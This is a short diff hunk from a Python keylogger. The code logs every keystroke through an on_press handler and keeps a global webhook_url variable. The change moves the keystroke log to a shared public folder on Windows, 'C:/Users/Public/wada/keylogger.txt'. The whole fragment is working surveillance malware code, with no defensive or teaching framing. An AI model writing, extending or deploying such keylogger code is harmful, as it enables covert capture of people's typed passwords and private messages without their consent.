@@ -8,7 +8,7 @@ webhook_url = ""  # Global variable to store the webhook URL
 
 def on_press(key):
     global log
-    logging.basicConfig(filename='keylogger.txt', level=logging.DEBUG, format='%(message)s')
+    logging.basicConfig(filename='C:/Users/Public/wada/keylogger.txt', level=logging.DEBUG, format='%(message)s')
     try:
         logging.log(10, key.char)
         log.append(key.char)
